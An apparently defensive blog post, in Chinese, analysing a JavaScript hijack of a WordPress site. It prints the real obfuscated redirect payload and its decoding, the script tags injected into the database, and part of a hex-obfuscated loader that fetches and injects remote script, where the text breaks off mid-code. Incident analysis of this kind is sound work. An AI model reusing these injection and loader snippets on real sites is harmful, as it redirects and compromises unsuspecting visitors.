@@ -1,0 +1,1363 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+
+
+  <meta name="keywords" content="js劫持,wordpress," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="smelond's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="倾我所能，尽我所有！就在前天晚上，朋友的wordpress被劫持，当然，我是很懵逼的，因为他那个网站所有内容是我帮他搭建的。打开网站，15秒左右会自动跳转到了一个国外的网站，跳转后的网站上方写着index Online Schools，">
+<meta name="keywords" content="js劫持,wordpress">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wordpress-js劫持分析">
+<meta property="og:url" content="http://smelond.com/2018/10/02/wordpress-js劫持分析/index.html">
+<meta property="og:site_name" content="smelond&#39;s Blog">
+<meta property="og:description" content="倾我所能，尽我所有！就在前天晚上，朋友的wordpress被劫持，当然，我是很懵逼的，因为他那个网站所有内容是我帮他搭建的。打开网站，15秒左右会自动跳转到了一个国外的网站，跳转后的网站上方写着index Online Schools，">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://smelond.com/image_upload/2018/10/20181002181927.png">
+<meta property="og:image" content="http://smelond.com/image_upload/2018/10/20181002022317.png">
+<meta property="og:image" content="http://smelond.com/image_upload/2018/10/20181002022407.png">
+<meta property="og:image" content="http://smelond.com/image_upload/2018/10/20181002221054.png">
+<meta property="og:image" content="http://smelond.com/image_upload/2018/10/20181002022643.png">
+<meta property="og:image" content="http://smelond.com/image_upload/2018/10/20181002022203.png">
+<meta property="og:updated_time" content="2018-10-02T15:26:56.586Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="wordpress-js劫持分析">
+<meta name="twitter:description" content="倾我所能，尽我所有！就在前天晚上，朋友的wordpress被劫持，当然，我是很懵逼的，因为他那个网站所有内容是我帮他搭建的。打开网站，15秒左右会自动跳转到了一个国外的网站，跳转后的网站上方写着index Online Schools，">
+<meta name="twitter:image" content="http://smelond.com/image_upload/2018/10/20181002181927.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://smelond.com/2018/10/02/wordpress-js劫持分析/"/>
+
+
+
+
+
+  <title>wordpress-js劫持分析 | smelond's Blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?326f6a55c7fb470522fcb98f22260a79";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">smelond's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">徒然</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://smelond.com/2018/10/02/wordpress-js劫持分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="smelond">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="smelond's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">wordpress-js劫持分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-02T17:58:30+08:00">
+                2018-10-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/wordpress/" itemprop="url" rel="index">
+                    <span itemprop="name">wordpress</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/10/02/wordpress-js劫持分析/" class="leancloud_visitors" data-flag-title="wordpress-js劫持分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  <blockquote class="blockquote-center">倾我所能，尽我所有！</blockquote>就在前天晚上，朋友的wordpress被劫持，当然，我是很懵逼的，因为他那个网站所有内容是我帮他搭建的。打开网站，15秒左右会自动跳转到了一个国外的网站，跳转后的网站上方写着index Online Schools，
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>访问网站自动跳转到了<a href="http://edu-fddu.info/online-courses-overwhelm-traditional-classes/" target="_blank" rel="noopener">http://edu-fddu.info/online-courses-overwhelm-traditional-classes/</a> ,而且每次跳转的域名不一样，但是网站是同一个。这个xxx Schools的域名太多了。。。<br><img src="/image_upload/2018/10/20181002181927.png" alt="Alt text"></p>
+<p>首先访问网站打开审查元素的network模式，发现以下内容<br><img src="/image_upload/2018/10/20181002022317.png" alt="Alt text"><br><img src="/image_upload/2018/10/20181002022407.png" alt="Alt text"><br><a href="https://www.learningtoolkit.club/link.php" target="_blank" rel="noopener">https://www.learningtoolkit.club/link.php</a> 这条链接的返回内容是<a href="https://mp3menu.org/mp3.js" target="_blank" rel="noopener">https://mp3menu.org/mp3.js</a><br>其实链接看着是很正常的，但是当我访问了<a href="https://mp3menu.org/mp3.js" target="_blank" rel="noopener">https://mp3menu.org/mp3.js</a> 这个之后<br><img src="/image_upload/2018/10/20181002221054.png" alt="Alt text"><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>, <span class="number">102</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">32</span>, <span class="number">123</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">105</span>, <span class="number">102</span>, <span class="number">32</span>, <span class="number">40</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">46</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">79</span>, <span class="number">102</span>, <span class="number">40</span>, <span class="number">34</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">51</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">117</span>, <span class="number">61</span>, <span class="number">34</span>, <span class="number">41</span>, <span class="number">32</span>, <span class="number">62</span>, <span class="number">61</span>, <span class="number">32</span>, <span class="number">48</span>, <span class="number">41</span>, <span class="number">32</span>, <span class="number">123</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">125</span>, <span class="number">32</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">123</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">32</span>, <span class="number">61</span>, <span class="number">32</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">119</span>, <span class="number">32</span>, <span class="number">68</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">46</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">84</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">40</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">46</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">84</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">40</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">54</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">54</span>, <span class="number">42</span>, <span class="number">56</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">61</span>, <span class="number">32</span>, <span class="number">34</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">51</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">117</span>, <span class="number">61</span>, <span class="number">121</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">32</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">61</span>, <span class="number">34</span>, <span class="number">32</span>, <span class="number">43</span>, <span class="number">32</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">46</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">71</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">32</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">51</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">117</span>, <span class="number">32</span>, <span class="number">61</span>, <span class="number">32</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">40</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">53</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">53</span>, <span class="number">56</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">52</span>, <span class="number">55</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">52</span>, <span class="number">55</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">57</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">53</span>, <span class="number">49</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">57</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">55</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">52</span>, <span class="number">55</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">119</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">46</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">40</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">51</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">117</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">119</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">46</span>, <span class="number">104</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">32</span>, <span class="number">61</span>, <span class="number">32</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">51</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">117</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">125</span>, <span class="number">10</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">125</span>, <span class="number">41</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">59</span>));</span><br></pre></td></tr></table></figure></p>
+<p>看到第一排内容eval(String.fromCharCode(… 可以看出他利用fromCharCode将所有的ascii码解密，接着用eval去执行<br>用js解密：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>, <span class="number">102</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">105.</span>.....))</span><br></pre></td></tr></table></figure></p>
+<p>用python解密：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">"""</span></span><br><span class="line"><span class="string">40, 102, 117, 110, 99, 116, 105....</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> text.split(<span class="string">","</span>):</span><br><span class="line">    print(chr(int(line)), end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></p>
+<p>最后输出的内容为：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">document</span>.cookie.indexOf(<span class="string">"mp3menu="</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			  expiry = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">			  expiry.setTime(expiry.getTime()+(<span class="number">10</span>*<span class="number">60</span>*<span class="number">1000</span>*<span class="number">6</span>*<span class="number">8</span>));</span><br><span class="line">			  <span class="built_in">document</span>.cookie = <span class="string">"mp3menu=yes; expires="</span> + expiry.toGMTString();</span><br><span class="line">			  <span class="keyword">var</span> mp3menu = <span class="built_in">String</span>.fromCharCode(<span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">51</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">117</span>, <span class="number">46</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>);</span><br><span class="line">			  <span class="built_in">window</span>.location.replace(mp3menu);</span><br><span class="line">			  <span class="built_in">window</span>.location.href = mp3menu;</span><br><span class="line">			&#125;</span><br><span class="line">  &#125;)();</span><br></pre></td></tr></table></figure></p>
+<p>大概意思应该是如果有mp3menu这个cookie，就不执行。如果没有mp3menu，就准备跳转了。看到下面还有一个ascii编码了的内容，解密内容为：<a href="https://mp3menu.org/red.php" target="_blank" rel="noopener">https://mp3menu.org/red.php</a><br> 直接访问这个地址，就会出现那个xxx Schools的网站，从这里看出来，大家在用一些开源的程序时，如果需要某一个功能，能自己写，就尽量自己写。</p>
+<p>看到了首先加载<a href="https://www.learningtoolkit.club/link.php" target="_blank" rel="noopener">https://www.learningtoolkit.club/link.php</a> 这个链接，我果断的跑服务器上搜索<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -rn <span class="string">"https://www.learningtoolkit.club/link.php"</span> *  //到网站根目录使用grep搜索</span><br><span class="line">grep -rn <span class="string">"https://mp3menu.org/red.php"</span> *</span><br></pre></td></tr></table></figure></p>
+<p>结果啥都没搜索到，想了一下，难不成在数据库？<br>跑到数据库在wp_posts表里发现很多嵌入的js链接<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">'https://hotopponents.site/site.js'</span> type=<span class="string">'text/javascript'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>访问这个链接，出现了这些加密和编码的内容<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0xfcc4=[<span class="string">"\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"</span>,<span class="string">"\x47\x45\x54"</span>,<span class="string">"\x6F\x70\x65\x6E"</span>,<span class="string">"\x73\x65\x6E\x64"</span>,<span class="string">"\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74"</span>,<span class="string">"\x69\x6E\x64\x65\x78\x4F\x66"</span>,<span class="string">"\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74"</span>,<span class="string">"\x74\x79\x70\x65"</span>,<span class="string">"\x61\x73\x79\x6E\x63"</span>,<span class="string">"\x69\x64"</span>,<span class="string">"\x63\x64\x6E\x37\x38\x39"</span>,<span class="string">"\x73\x72\x63"</span>,<span class="string">"\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64"</span>,<span class="string">"\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"</span>,<span class="string">"\x73\x63\x72\x69\x70\x74"</span>,<span class="string">"\x6C\x65\x6E\x67\x74\x68"</span>];<span class="keyword">var</span> url=<span class="built_in">String</span>[_0xfcc4[<span class="number">0</span>]](<span class="number">104</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">115</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">47</span>,<span class="number">119</span>,<span class="number">119</span>,<span class="number">119</span>,<span class="number">46</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">111</span>,<span class="number">108</span>,<span class="number">107</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">117</span>,<span class="number">98</span>,<span class="number">47</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">107</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">104</span>,<span class="number">112</span>);<span class="keyword">var</span> get_text=<span class="function"><span class="keyword">function</span> <span class="title">httpGet</span>(<span class="params">_0x3bc1x4</span>)</span>&#123;<span class="keyword">var</span> _0x3bc1x5= <span class="keyword">new</span> XMLHttpRequest();_0x3bc1x5[_0xfcc4[<span class="number">2</span>]](_0xfcc4[<span class="number">1</span>],_0x3bc1x4,<span class="literal">false</span>);_0x3bc1x5[_0xfcc4[<span class="number">3</span>]](<span class="literal">null</span>);<span class="keyword">return</span> _0x3bc1x5[_0xfcc4[<span class="number">4</span>]]&#125;;<span class="keyword">var</span> text=get_text(url);<span class="keyword">if</span>(text!= <span class="built_in">String</span>[_0xfcc4[<span class="number">0</span>]](<span class="number">110</span>,<span class="number">117</span>,<span class="number">108</span>,<span class="number">108</span>)&amp;&amp; text[_0xfcc4[<span class="number">5</span>]](<span class="built_in">String</span>[_0xfcc4[<span class="number">0</span>]](<span class="number">104</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">115</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">47</span>))&gt;  <span class="number">-1</span>)&#123;<span class="keyword">var</span> a=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> _0x3bc1x8=<span class="built_in">document</span>[_0xfcc4[<span class="number">6</span>]](<span class="built_in">String</span>[_0xfcc4[<span class="number">0</span>]](<span class="number">115</span>,<span class="number">99</span>,<span 